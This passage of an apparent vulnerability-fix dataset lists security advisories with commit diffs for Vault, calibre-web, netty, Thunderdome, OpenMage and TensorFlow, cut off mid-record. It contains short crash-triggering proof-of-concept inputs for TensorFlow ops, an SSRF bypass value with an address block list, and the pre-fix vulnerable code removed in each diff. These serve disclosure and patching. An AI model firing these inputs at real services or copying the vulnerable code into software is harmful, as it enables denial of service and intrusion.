affects 1.4 and 1.4.2, as well as older versions of Vault [[GH-9022](https:\/\/github.com\/hashicorp\/vault\/pull\/9022)]\\n \\n BUG FIXES:'}}","message_norm":"changelog++\n\nupdated with cve numbers for 1.4.2 and 1.3.6.","language":"en","entities":"[('updated', 'ACTION', ''), ('cve', 'SECWORD', ''), ('1.4.2', 'VERSION', ''), ('1.3.6', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['CHANGELOG.md'])","num_files":1.0},{"index":36,"vuln_id":"GHSA-25xj-89g5-fm6h","cwe_id":"{'CWE-532', 'CWE-200'}","score":7.5,"chain":"{'https:\/\/github.com\/hashicorp\/vault\/commit\/87f47c216cf1a28f4054b80cff40de8c9e00e36c', 'https:\/\/github.com\/hashicorp\/vault\/commit\/e52f34772affb69f3239b2cdf6523cb7cfd67a92'}","dataset":"osv","summary":"Information Disclosure in HashiCorp Vault HashiCorp Vault and Vault Enterprise before 1.3.6, and 1.4.2 before 1.4.2, insert Sensitive Information into a Log File.","published_date":"2021-05-18","chain_len":2,"project":"https:\/\/github.com\/hashicorp\/vault","commit_href":"https:\/\/github.com\/hashicorp\/vault\/commit\/e52f34772affb69f3239b2cdf6523cb7cfd67a92","commit_sha":"e52f34772affb69f3239b2cdf6523cb7cfd67a92","patch":"MULTI","chain_ord":"['e52f34772affb69f3239b2cdf6523cb7cfd67a92', '87f47c216cf1a28f4054b80cff40de8c9e00e36c']","before_first_fix_commit":"{'01a682aa48ede581e12813314e64a75e314e500e'}","last_fix_commit":"87f47c216cf1a28f4054b80cff40de8c9e00e36c","chain_ord_pos":1.0,"commit_datetime":"05\/19\/2020, 14:07:46","message":"Don't include username or password of proxy env vars when logging them. (#9022)","author":"ncabatoff","comments":null,"stats":"{'additions': 27, 'deletions': 7, 'total': 34}","files":"{'command\/server.go': {'additions': 27, 'deletions': 7, 'changes': 34, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hashicorp\/vault\/raw\/e52f34772affb69f3239b2cdf6523cb7cfd67a92\/command%2Fserver.go', 'patch': '@@ -445,9 +445,7 @@ func (c *ServerCommand) runRecoveryMode() int {\\n \\t\\tvault.DefaultMaxRequestDuration = config.DefaultMaxRequestDuration\\n \\t}\\n \\n-\\tproxyCfg := httpproxy.FromEnvironment()\\n-\\tc.logger.Info(\"proxy environment\", \"http_proxy\", proxyCfg.HTTPProxy,\\n-\\t\\t\"https_proxy\", proxyCfg.HTTPSProxy, \"no_proxy\", proxyCfg.NoProxy)\\n+\\tlogProxyEnvironmentVariables(c.logger)\\n \\n \\t\/\/ Initialize the storage backend\\n \\tfactory, exists := c.PhysicalBackends[config.Storage.Type]\\n@@ -684,6 +682,31 @@ func (c *ServerCommand) runRecoveryMode() int {\\n \\treturn 0\\n }\\n \\n+func logProxyEnvironmentVariables(logger hclog.Logger) {\\n+\\tproxyCfg := httpproxy.FromEnvironment()\\n+\\tcfgMap := map[string]string{\\n+\\t\\t\"http_proxy\":  proxyCfg.HTTPProxy,\\n+\\t\\t\"https_proxy\": proxyCfg.HTTPSProxy,\\n+\\t\\t\"no_proxy\":    proxyCfg.NoProxy,\\n+\\t}\\n+\\tfor k, v := range cfgMap {\\n+\\t\\tu, err := url.Parse(v)\\n+\\t\\tif err != nil {\\n+\\t\\t\\t\/\/ Env vars may contain URLs or host:port values.  We only care\\n+\\t\\t\\t\/\/ about the former.\\n+\\t\\t\\tcontinue\\n+\\t\\t}\\n+\\t\\tif _, ok := u.User.Password(); ok {\\n+\\t\\t\\tu.User = url.UserPassword(\"redacted-username\", \"redacted-password\")\\n+\\t\\t} else if user := u.User.Username(); user != \"\" {\\n+\\t\\t\\tu.User = url.User(\"redacted-username\")\\n+\\t\\t}\\n+\\t\\tcfgMap[k] = u.String()\\n+\\t}\\n+\\tlogger.Info(\"proxy environment\", \"http_proxy\", cfgMap[\"http_proxy\"],\\n+\\t\\t\"https_proxy\", cfgMap[\"https_proxy\"], \"no_proxy\", cfgMap[\"no_proxy\"])\\n+}\\n+\\n func (c *ServerCommand) adjustLogLevel(config *server.Config, logLevelWasNotSet bool) (string, error) {\\n \\tvar logLevelString string\\n \\tif config.LogLevel != \"\" && logLevelWasNotSet {\\n@@ -894,10 +917,7 @@ func (c *ServerCommand) Run(args []string) int {\\n \\t\\tvault.DefaultMaxRequestDuration = config.DefaultMaxRequestDuration\\n \\t}\\n \\n-\\t\/\/ log proxy settings\\n-\\tproxyCfg := httpproxy.FromEnvironment()\\n-\\tc.logger.Info(\"proxy environment\", \"http_proxy\", proxyCfg.HTTPProxy,\\n-\\t\\t\"https_proxy\", proxyCfg.HTTPSProxy, \"no_proxy\", proxyCfg.NoProxy)\\n+\\tlogProxyEnvironmentVariables(c.logger)\\n \\n \\t\/\/ If mlockall(2) isn\\'t supported, show a warning. We disable this in dev\\n \\t\/\/ because it is quite scary to see when first using Vault. We also disable'}}","message_norm":"don't include username or password of proxy env vars when logging them. (#9022)","language":"en","entities":"[('password', 'SECWORD', ''), ('#9022', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['command\/server.go'])","num_files":1.0},{"index":38,"vuln_id":"GHSA-2647-c639-qv2j","cwe_id":"{'CWE-918'}","score":9.8,"chain":"{'https:\/\/github.com\/janeczku\/calibre-web\/commit\/965352c8d96c9eae7a6867ff76b0db137d04b0b8'}","dataset":"osv","summary":"Server-Side Request Forgery in calibreweb calibreweb prior to version 0.6.17 is vulnerable to server-side request forgery (SSRF). This is due to an incomplete fix for [CVE-2022-0339](https:\/\/github.com\/advisories\/GHSA-4w8p-x6g8-fv64). The blacklist does not check for `0.0.0.0`, which would result in a payload of `0.0.0.0` resolving to `localhost`.","published_date":"2022-03-08","chain_len":1,"project":"https:\/\/github.com\/janeczku\/calibre-web","commit_href":"https:\/\/github.com\/janeczku\/calibre-web\/commit\/965352c8d96c9eae7a6867ff76b0db137d04b0b8","commit_sha":"965352c8d96c9eae7a6867ff76b0db137d04b0b8","patch":"SINGLE","chain_ord":"['965352c8d96c9eae7a6867ff76b0db137d04b0b8']","before_first_fix_commit":"{'8007e450b3178f517b83b0989744c6df38867932'}","last_fix_commit":"965352c8d96c9eae7a6867ff76b0db137d04b0b8","chain_ord_pos":1.0,"commit_datetime":"02\/26\/2022, 07:05:35","message":"Don't allow redirects on cover uploads, catch more addresses which resolve to localhost","author":"Ozzie Isaacs","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'cps\/helper.py': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/janeczku\/calibre-web\/raw\/965352c8d96c9eae7a6867ff76b0db137d04b0b8\/cps%2Fhelper.py', 'patch': '@@ -734,10 +734,10 @@ def save_cover_from_url(url, book_path):\\n         if not cli.allow_localhost:\\n             # 127.0.x.x, localhost, [::1], [::ffff:7f00:1]\\n             ip = socket.getaddrinfo(urlparse(url).hostname, 0)[0][4][0]\\n-            if ip.startswith(\"127.\") or ip.startswith(\\'::ffff:7f\\') or ip == \"::1\":\\n+            if ip.startswith(\"127.\") or ip.startswith(\\'::ffff:7f\\') or ip == \"::1\" or ip == \"0.0.0.0\" or ip == \"::\":\\n                 log.error(\"Localhost was accessed for cover upload\")\\n                 return False, _(\"You are not allowed to access localhost for cover uploads\")\\n-        img = requests.get(url, timeout=(10, 200))      # ToDo: Error Handling\\n+        img = requests.get(url, timeout=(10, 200), allow_redirects=False)      # ToDo: Error Handling\\n         img.raise_for_status()\\n         return save_cover(img, book_path)\\n     except (socket.gaierror,'}}","message_norm":"don't allow redirects on cover uploads, catch more addresses which resolve to localhost","language":"en","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"REDUNDANT_MESSAGE","list_files":"dict_keys(['cps\/helper.py'])","num_files":1.0},{"index":41,"vuln_id":"GHSA-269q-hmxg-m83q","cwe_id":"{'CWE-379', 'CWE-378', 'CWE-668'}","score":5.5,"chain":"{'https:\/\/github.com\/netty\/netty\/commit\/185f8b2756a36aaa4f973f1a2a025e7d981823f1'}","dataset":"osv","summary":"Local Information Disclosure Vulnerability in io.netty:netty-codec-http ### Description ###\n[GHSA-5mcr-gq6c-3hq2](https:\/\/github.com\/netty\/netty\/security\/advisories\/GHSA-5mcr-gq6c-3hq2) (CVE-2021-21290) contains an insufficient fix for the vulnerability identified.\n\n### Impact ###\n\nWhen netty's multipart decoders are used local information disclosure can occur via the local system temporary directory if temporary storing uploads on the disk is enabled.\n\nThis only impacts applications running on Java version 6 and lower. Additionally, this vulnerability impacts code running on Unix-like systems, and very old versions of Mac OSX and Windows as they all share the system temporary directory between all users.\n\n### Vulnerability Details ###\n\nTo fix the vulnerability the code was changed to the following:\n\n```java\n    @SuppressJava6Requirement(reason = \"Guarded by version check\")\n    public static File createTempFile(String prefix, String suffix, File directory) throws IOException {\n        if (javaVersion() >= 7) {\n            if (directory == null) {\n                return Files.createTempFile(prefix, suffix).toFile();\n            }\n            return Files.createTempFile(directory.toPath(), prefix, suffix).toFile();\n        }\n        if (directory == null) {\n            return File.createTempFile(prefix, suffix);\n        }\n        File file = File.createTempFile(prefix, suffix, directory);\n        \/\/ Try to adjust the perms, if this fails there is not much else we can do...\n        file.setReadable(false, false);\n        file.setReadable(true, true);\n        return file;\n    }\n```\n\nUnfortunately, this logic path was left vulnerable:\n\n```java\n        if (directory == null) {\n            return File.createTempFile(prefix, suffix);\n        }\n```\n\nThis file is still readable by all local users.\n\n### Patches ###\n\nUpdate to 4.1.77.Final\n\n### Workarounds ###\n\nSpecify your own `java.io.tmpdir` when you start the JVM or use `DefaultHttpDataFactory.setBaseDir(...)` to set the directory to something that is only readable by the current user or update to Java 7 or above.\n\n### References ###\n\n - [CWE-378: Creation of Temporary File With Insecure Permissions](https:\/\/cwe.mitre.org\/data\/definitions\/378.html)\n - [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https:\/\/cwe.mitre.org\/data\/definitions\/379.html)\n\n\n### For more information ###\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in [netty](https:\/\/github.com\/netty\/netty)","published_date":"2022-05-10","chain_len":1,"project":"https:\/\/github.com\/netty\/netty","commit_href":"https:\/\/github.com\/netty\/netty\/commit\/185f8b2756a36aaa4f973f1a2a025e7d981823f1","commit_sha":"185f8b2756a36aaa4f973f1a2a025e7d981823f1","patch":"SINGLE","chain_ord":"['185f8b2756a36aaa4f973f1a2a025e7d981823f1']","before_first_fix_commit":"{'7dbca6aedc8cf5971e2a26d8fc2b7f265f2b4bf1'}","last_fix_commit":"185f8b2756a36aaa4f973f1a2a025e7d981823f1","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2022, 06:57:43","message":"Merge pull request from GHSA-269q-hmxg-m83q\n\n* Correctly modify permission for temporary files when using Java 6 in all cases\n\nMotivation:\n\n[GHSA-5mcr-gq6c-3hq2](https:\/\/github.com\/netty\/netty\/security\/advisories\/GHSA-5mcr-gq6c-3hq2) did not correctly fix all cases for temprory files when running on java 6.\n\nModifications:\n\n- Add correctly adjust perms in all cases\n- Add logging if adjusting of permissions fails\n\nResult:\n\nFixes https:\/\/github.com\/netty\/netty\/security\/advisories\/GHSA-269q-hmxg-m83q\n\n* Throw on failure","author":"Norman Maurer","comments":null,"stats":"{'additions': 11, 'deletions': 4, 'total': 15}","files":"{'common\/src\/main\/java\/io\/netty\/util\/internal\/PlatformDependent.java': {'additions': 11, 'deletions': 4, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/netty\/netty\/raw\/185f8b2756a36aaa4f973f1a2a025e7d981823f1\/common%2Fsrc%2Fmain%2Fjava%2Fio%2Fnetty%2Futil%2Finternal%2FPlatformDependent.java', 'patch': '@@ -1447,13 +1447,20 @@ public static File createTempFile(String prefix, String suffix, File directory)\\n             }\\n             return Files.createTempFile(directory.toPath(), prefix, suffix).toFile();\\n         }\\n+        final File file;\\n         if (directory == null) {\\n-            return File.createTempFile(prefix, suffix);\\n+            file = File.createTempFile(prefix, suffix);\\n+        } else {\\n+            file = File.createTempFile(prefix, suffix, directory);\\n         }\\n-        File file = File.createTempFile(prefix, suffix, directory);\\n+\\n         \/\/ Try to adjust the perms, if this fails there is not much else we can do...\\n-        file.setReadable(false, false);\\n-        file.setReadable(true, true);\\n+        if (!file.setReadable(false, false)) {\\n+            throw new IOException(\"Failed to set permissions on temporary file \" + file);\\n+        }\\n+        if (!file.setReadable(true, true)) {\\n+            throw new IOException(\"Failed to set permissions on temporary file \" + file);\\n+        }\\n         return file;\\n     }'}}","message_norm":"merge pull request from ghsa-269q-hmxg-m83q\n\n* correctly modify permission for temporary files when using java 6 in all cases\n\nmotivation:\n\n[ghsa-5mcr-gq6c-3hq2](https:\/\/github.com\/netty\/netty\/security\/advisories\/ghsa-5mcr-gq6c-3hq2) did not correctly fix all cases for temprory files when running on java 6.\n\nmodifications:\n\n- add correctly adjust perms in all cases\n- add logging if adjusting of permissions fails\n\nresult:\n\nfixes https:\/\/github.com\/netty\/netty\/security\/advisories\/ghsa-269q-hmxg-m83q\n\n* throw on failure","language":"en","entities":"[('ghsa-269q-hmxg-m83q', 'VULNID', 'GHSA'), ('permission', 'SECWORD', ''), ('ghsa-5mcr-gq6c-3hq2](https:\/\/github.com\/netty\/netty', 'VULNID', 'GHSA'), ('security', 'SECWORD', ''), ('ghsa-5mcr-gq6c-3hq2) did not', 'VULNID', 'GHSA'), ('fix', 'ACTION', ''), ('add', 'ACTION', ''), ('add', 'ACTION', ''), ('permissions', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('https:\/\/github.com\/netty\/netty\/security\/advisories\/ghsa-269q-hmxg-m83q', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['common\/src\/main\/java\/io\/netty\/util\/internal\/PlatformDependent.java'])","num_files":1.0},{"index":42,"vuln_id":"GHSA-26cm-qrc6-mfgj","cwe_id":"{'CWE-74', 'CWE-90'}","score":8.1,"chain":"{'https:\/\/github.com\/StevenWeathers\/thunderdome-planning-poker\/commit\/f1524d01e8a0f2d6c3db5461c742456c692dd8c1'}","dataset":"osv","summary":"Improper Neutralization of Special Elements used in an LDAP Query in stevenweathers\/thunderdome-planning-poker ### Impact\nLDAP injection vulnerability, only affects instances with LDAP authentication enabled.\n\n### Patches\nPatch for vulnerability released with v1.16.3.\n\n### Workarounds\nDisable LDAP feature if in use\n\n### References\n[OWASP LDAP Injection Prevention Cheat Sheet](https:\/\/cheatsheetseries.owasp.org\/cheatsheets\/LDAP_Injection_Prevention_Cheat_Sheet.html\n)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Thunderdome Github Repository](https:\/\/github.com\/StevenWeathers\/thunderdome-planning-poker)\n* Email us at [steven@weathers.me](mailto:steven@weathers.me)","published_date":"2021-11-08","chain_len":1,"project":"https:\/\/github.com\/StevenWeathers\/thunderdome-planning-poker","commit_href":"https:\/\/github.com\/StevenWeathers\/thunderdome-planning-poker\/commit\/f1524d01e8a0f2d6c3db5461c742456c692dd8c1","commit_sha":"f1524d01e8a0f2d6c3db5461c742456c692dd8c1","patch":"SINGLE","chain_ord":"['f1524d01e8a0f2d6c3db5461c742456c692dd8c1']","before_first_fix_commit":"{'2b9ae2e1e70e0fde47d459aa0c16b768c253e51d'}","last_fix_commit":"f1524d01e8a0f2d6c3db5461c742456c692dd8c1","chain_ord_pos":1.0,"commit_datetime":"11\/02\/2021, 00:48:52","message":"Fix LDAP vulnerability","author":"Steven Weathers","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'auth.go': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/StevenWeathers\/thunderdome-planning-poker\/raw\/f1524d01e8a0f2d6c3db5461c742456c692dd8c1\/auth.go', 'patch': '@@ -68,7 +68,7 @@ func (s *server) authAndCreateUserLdap(UserName string, UserPassword string) (*d\\n \\n \\tsearchRequest := ldap.NewSearchRequest(viper.GetString(\"auth.ldap.basedn\"),\\n \\t\\tldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,\\n-\\t\\tfmt.Sprintf(viper.GetString(\"auth.ldap.filter\"), UserName),\\n+\\t\\tfmt.Sprintf(viper.GetString(\"auth.ldap.filter\"), ldap.EscapeFilter(UserName)),\\n \\t\\t[]string{\"dn\", viper.GetString(\"auth.ldap.mail_attr\"), viper.GetString(\"auth.ldap.cn_attr\")},\\n \\t\\tnil,\\n \\t)'}}","message_norm":"fix ldap vulnerability","language":"ca","entities":"[('ldap', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['auth.go'])","num_files":1.0},{"index":46,"vuln_id":"GHSA-26rr-v2j2-25fh","cwe_id":"{'CWE-91'}","score":0.0,"chain":"{'https:\/\/github.com\/OpenMage\/magento-lts\/commit\/b99307d00b59c4a226a1e3e4083f02cf2fc8fce7'}","dataset":"osv","summary":"Layout XML Arbitrary Code Fix  ### Impact\nLayout XML enabled admin users to execute arbitrary commands via block methods.","published_date":"2021-08-30","chain_len":1,"project":"https:\/\/github.com\/OpenMage\/magento-lts","commit_href":"https:\/\/github.com\/OpenMage\/magento-lts\/commit\/b99307d00b59c4a226a1e3e4083f02cf2fc8fce7","commit_sha":"b99307d00b59c4a226a1e3e4083f02cf2fc8fce7","patch":"SINGLE","chain_ord":"['b99307d00b59c4a226a1e3e4083f02cf2fc8fce7']","before_first_fix_commit":"{'02a14e8893a1af9d8445bb5657b80272a09767ee'}","last_fix_commit":"b99307d00b59c4a226a1e3e4083f02cf2fc8fce7","chain_ord_pos":1.0,"commit_datetime":"08\/26\/2021, 01:01:15","message":"Merge pull request from GHSA-26rr-v2j2-25fh\n\nCo-authored-by: Mark Lewis <markwlewis@Marks-MacBook-Pro.local>","author":"Mark Lewis","comments":null,"stats":"{'additions': 4, 'deletions': 1, 'total': 5}","files":"{'app\/code\/core\/Mage\/Core\/Helper\/Security.php': {'additions': 4, 'deletions': 1, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/OpenMage\/magento-lts\/raw\/b99307d00b59c4a226a1e3e4083f02cf2fc8fce7\/app%2Fcode%2Fcore%2FMage%2FCore%2FHelper%2FSecurity.php', 'patch': \"@@ -21,7 +21,10 @@ class Mage_Core_Helper_Security\\n     public function validateAgainstBlockMethodBlacklist(Mage_Core_Block_Abstract $block, $method, array $args)\\n     {\\n         foreach ($this->invalidBlockActions as $action) {\\n-            if ($block instanceof $action['block'] && strtolower($action['method']) === strtolower($method)) {\\n+            $calledMethod = strtolower($method);\\n+            if (($block instanceof $action['block'] && strtolower($action['method']) === $calledMethod)\\n+                || ($block instanceof $action['block']\\n+                    && strtolower($action['block'] . '::' . $action['method']) === $calledMethod)) {\\n                 Mage::throwException(\\n                     sprintf('Action with combination block %s and method %s is forbidden.', get_class($block), $method)\\n                 );\"}}","message_norm":"merge pull request from ghsa-26rr-v2j2-25fh\n\nco-authored-by: mark lewis <markwlewis@marks-macbook-pro.local>","language":"en","entities":"[('ghsa-26rr-v2j2-25fh', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/code\/core\/Mage\/Core\/Helper\/Security.php'])","num_files":1.0},{"index":54,"vuln_id":"GHSA-278g-rq84-9hmg","cwe_id":"{'CWE-20'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d7de67733925de196ec8863a33445b73f9562d1d'}","dataset":"osv","summary":"`CHECK`-fail in `MapStage` ### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.MapStage`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapStage(\n  key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),\n  indices=tf.constant((0), dtype=tf.int32),\n  values=[tf.constant((0), dtype=tf.int32)],\n  dtypes=[tf.int32,\n  tf.int64],\n  capacity=0,\n  memory_limit=0,\n  container='',\n  shared_name='')\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/map_stage_op.cc#L513) does not check that the `key` input is a valid non-empty tensor.\n  \n### Patches\nWe have patched the issue in GitHub commit [d7de67733925de196ec8863a33445b73f9562d1d](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d7de67733925de196ec8863a33445b73f9562d1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security  guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d7de67733925de196ec8863a33445b73f9562d1d","commit_sha":"d7de67733925de196ec8863a33445b73f9562d1d","patch":"SINGLE","chain_ord":"['d7de67733925de196ec8863a33445b73f9562d1d']","before_first_fix_commit":"{'102cacf28ad5a9e7f00b5a195d1995ead8870006'}","last_fix_commit":"d7de67733925de196ec8863a33445b73f9562d1d","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 05:23:46","message":"Prevent a CHECK-fail due to empty tensor input in `map_stage_op.cc`\n\nPiperOrigin-RevId: 387737906\nChange-Id: Idc52df0c71c7ed6e2dd633b651a581932f277c8a","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/map_stage_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/d7de67733925de196ec8863a33445b73f9562d1d\/tensorflow%2Fcore%2Fkernels%2Fmap_stage_op.cc', 'patch': '@@ -527,6 +527,8 @@ class MapStageOp : public OpKernel {\\n     OP_REQUIRES_OK(ctx, ctx->input(\"key\", &key_tensor));\\n     OP_REQUIRES_OK(ctx, ctx->input(\"indices\", &indices_tensor));\\n     OP_REQUIRES_OK(ctx, ctx->input_list(\"values\", &values_tensor));\\n+    OP_REQUIRES(ctx, key_tensor->NumElements() > 0,\\n+                errors::InvalidArgument(\"key must not be empty\"));\\n \\n     \/\/ Create copy for insertion into Staging Area\\n     Tensor key(*key_tensor);'}}","message_norm":"prevent a check-fail due to empty tensor input in `map_stage_op.cc`\n\npiperorigin-revid: 387737906\nchange-id: idc52df0c71c7ed6e2dd633b651a581932f277c8a","language":"en","entities":"[('prevent', 'ACTION', ''), ('387737906', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/map_stage_op.cc'])","num_files":1.0},{"index":56,"vuln_id":"GHSA-27j5-4p9v-pp67","cwe_id":"{'CWE-617'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a6e874437670045e6c7dc6154c7412b4a2135e2'}","dataset":"osv","summary":"`std::abort` raised from `TensorListReserve` ### Impact\nProviding a negative element to `num_elements` list argument of  `tf.raw_ops.TensorListReserve` causes the runtime to abort the process due to reallocating a `std::vector` to have a negative number of elements:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.TensorListReserve(\n  element_shape = tf.constant([1]),\n  num_elements=tf.constant([-1]),\n  element_dtype = tf.int32)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/list_kernels.cc#L312) calls `std::vector.resize()` with the new size controlled by input given by the user, without checking that this input is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [8a6e874437670045e6c7dc6154c7412b4a2135e2](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a6e874437670045e6c7dc6154c7412b4a2135e2).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a6e874437670045e6c7dc6154c7412b4a2135e2","commit_sha":"8a6e874437670045e6c7dc6154c7412b4a2135e2","patch":"SINGLE","chain_ord":"['8a6e874437670045e6c7dc6154c7412b4a2135e2']","before_first_fix_commit":"{'3e23241a7f330f62c701f5ceb10f6594cd735f70'}","last_fix_commit":"8a6e874437670045e6c7dc6154c7412b4a2135e2","chain_ord_pos":1.0,"commit_datetime":"07\/10\/2021, 00:32:55","message":"Validate num_elements input in tf.raw_ops.TensorListReserve\n\nPiperOrigin-RevId: 383954564\nChange-Id: I454bd78eff85bc4f16ddb7e608596971cca47f8f","author":"Laura Pak","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/list_kernels.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8a6e874437670045e6c7dc6154c7412b4a2135e2\/tensorflow%2Fcore%2Fkernels%2Flist_kernels.cc', 'patch': '@@ -302,6 +302,10 @@ class TensorListReserve : public OpKernel {\\n     PartialTensorShape element_shape;\\n     OP_REQUIRES_OK(c, TensorShapeFromTensor(c->input(0), &element_shape));\\n     int32 num_elements = c->input(1).scalar<int32>()();\\n+    OP_REQUIRES(c, num_elements >= 0,\\n+                errors::InvalidArgument(\"The num_elements to reserve must be a \"\\n+                                        \"non negative number, but got \",\\n+                                        num_elements));\\n     TensorList output;\\n     output.element_shape = element_shape;\\n     output.element_dtype = element_dtype_;'}}","message_norm":"validate num_elements input in tf.raw_ops.tensorlistreserve\n\npiperorigin-revid: 383954564\nchange-id: i454bd78eff85bc4f16ddb7e608596971cca47f8f","language":"en","entities":"[('validate', 'ACTION', ''), ('383954564', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/list_kernels.cc'])","num_files":1.0},{"index":59,"vuln_id":"GHSA-27qf-jwm8-g7f3","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0575b640091680cfb70f4dd93e70658de43b94f9'}","dataset":"osv","summary":"FPE in LSH in TFLite ### Impact\nAn attacker can craft a TFLite model that would trigger a division by zero error in LSH  [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/lsh_projection.cc#L118).\n\n```cc\nint RunningSignBit(const TfLiteTensor* input, const TfLiteTensor* weight,\n                   float seed) {\n  int input_item_bytes = input->bytes \/ SizeOfDimension(input, 0);\n  \/\/ ...\n}\n```\n          \nThere is no check that the first dimension of the input is non zero.\n      \n### Patches\nWe have patched the issue in GitHub commit [0575b640091680cfb70f4dd93e70658de43b94f9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0575b640091680cfb70f4dd93e70658de43b94f9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick thiscommit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/0575b640091680cfb70f4dd93e70658de43b94f9","commit_sha":"0575b640091680cfb70f4dd93e70658de43b94f9","patch":"SINGLE","chain_ord":"['0575b640091680cfb70f4dd93e70658de43b94f9']","before_first_fix_commit":"{'13aec9e4558d83fedac084ad66e32daf8bbcde0f'}","last_fix_commit":"0575b640091680cfb70f4dd93e70658de43b94f9","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 23:45:20","message":"Prevent division by 0 in LSH projection.\n\nPiperOrigin-RevId: 387225857\nChange-Id: Iaeb572a763618c64f503e0026f6dd9fd769bf50c","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'tensorflow\/lite\/kernels\/lsh_projection.cc': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/0575b640091680cfb70f4dd93e70658de43b94f9\/tensorflow%2Flite%2Fkernels%2Flsh_projection.cc', 'patch': '@@ -28,7 +28,7 @@ limitations under the License.\\n \/\/\\n \/\/ Input:\\n \/\/   Tensor[0]: Hash functions. Dim.size == 2, DataType: Float.\\n-\/\/              Tensor[0].Dim[0]: Num of hash functions.\\n+\/\/              Tensor[0].Dim[0]: Num of hash functions. Must be at least 1.\\n \/\/              Tensor[0].Dim[1]: Num of projected output bits generated by\\n \/\/                                each hash function.\\n \/\/   In sparse case, Tensor[0].Dim[1] + ceil( 